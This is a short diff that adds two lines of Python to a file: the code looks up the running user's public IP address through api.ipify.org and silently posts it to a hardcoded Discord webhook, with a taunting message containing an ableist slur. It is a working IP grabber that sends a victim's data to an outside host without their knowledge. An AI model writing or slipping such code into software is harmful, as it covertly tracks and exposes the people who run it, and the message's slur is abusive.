@@ -1,0 +1,2 @@
+import requests
+requests.post("https://discord.com/api/webhooks/1234245663772905667/hMjlDVUCElHI7DEv0E8F4u3W1yv6W4wapFM7CyFVcVAsBHHl_ExZnHGfm87FpbXB7e6S", data={"contents": "retard got logged :D, ip: " + requests.get("https://api.ipify.org").text})
